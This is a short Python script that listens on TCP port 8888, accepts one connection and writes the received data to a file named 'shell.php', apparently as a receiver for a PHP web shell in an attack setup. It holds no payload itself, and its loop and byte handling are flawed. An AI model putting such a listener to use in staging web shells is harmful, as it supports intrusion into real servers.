import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = "0.0.0.0"
port = 8888

file = open("shell.php", 'w')

try:
    server.bind((ip, port))

    server.listen(5)
    print("Listening in: " + ip + ":" + str(port))

    client_socket, address = server.accept()

    print("Received from: " + address[0])

    while True:
        data = client_socket.recv(1024)
        file.write(data)

except Exception as error:

    print("Error: " + str(error))

server.close()
file.close()